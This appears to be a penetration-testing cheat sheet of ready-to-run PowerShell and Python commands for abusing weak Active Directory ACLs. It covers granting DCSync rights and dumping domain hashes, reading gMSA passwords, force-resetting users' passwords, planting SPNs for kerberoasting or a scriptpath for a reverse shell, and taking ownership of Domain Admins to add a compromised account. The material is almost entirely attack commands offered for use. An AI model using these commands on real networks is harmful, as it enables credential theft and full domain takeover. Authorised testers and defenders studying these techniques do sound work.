# Abuse Weak Access Control Lists (ACLs)

## **Write DACL**

{% code overflow="wrap" %}
```
$SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$SecPassword
```
{% endcode %}

```
Add-ObjectACL -PrincipalIdentity compromiseduser -Credential $cred -Rights DCSync
```

_From the attacking box_

```
secretsdumps.py $domain/user@$ip
```

## **GetChangesAll (DCSync)**

_From the attacking box_

```
secretsdump.py domain/user@ip
```

Or use Mimikatz

## **ReadGMSApassword**

#### Remotely&#x20;

_You may need to use ntpdate $domain if you get clockscrew error_

```
python2 /opt/gMSADumper/gMSADumper.py -d $domain -u CompromisedUser -p Password
```

#### Locally&#x20;

```
.\GMSAPasswordReader.exe --AccountName 'ReadGMSApassword_Rights_To_User'
```

## **ForceChangePassword**

```
$CompromisedUserName = 'CompromisedUserName'
```

{% code overflow="wrap" %}
```
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
```
{% endcode %}

```
$LateralEscUserPass = ConvertTo-SecureString 'LateralEscUserPass' -AsPlainText -Force
```

{% code overflow="wrap" %}
```
Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $LateralEscUserPass -Credential $Cred
```
{% endcode %}

## **GenericAll**

```
$CompromisedUserName = 'CompromisedUserName'
```

{% code overflow="wrap" %}
```
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity LateralEscUserName -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
```
{% endcode %}

## **GenericWrite**

_Use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast_

```ps1
$CompromisedUserName = 'CompromisedUserName'
```

{% code overflow="wrap" %}
```
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
```
{% endcode %}

{% code overflow="wrap" %}
```
Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{serviceprincipalname='thescriptkid/thescriptkid'}
```
{% endcode %}

```
Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
```

#### OR

{% code overflow="wrap" %}
```
Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpath='C:\\path\\to\\script.ps1'}
```
{% endcode %}

## **WriteOwner**

```ps1
$CompromisedUserName = 'CompromisedUserName'
```

{% code overflow="wrap" %}
```
$CompromisedUserPass = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```
$Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserName,$CompromisedUserPass
```
{% endcode %}

{% code overflow="wrap" %}
```
Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity CompromisedUser
```
{% endcode %}

{% code overflow="wrap" %}
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity CompromisedUser -Rights All
```
{% endcode %}

{% code overflow="wrap" %}
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Credential $Cred
```
{% endcode %}

## Automation

_Find ACLs of interest whether it be the current compromised user, or users found. start with current user._

{% code overflow="wrap" %}
```
Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.identityreferencename -like "*CompromisedUser*"}
```
{% endcode %}

{% code overflow="wrap" %}
```
Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.ActiveDirectoryRights -like "*GenericAll*"} | Where-Object {$_.identityreferenceclass -ne "computer"}
```
{% endcode %}
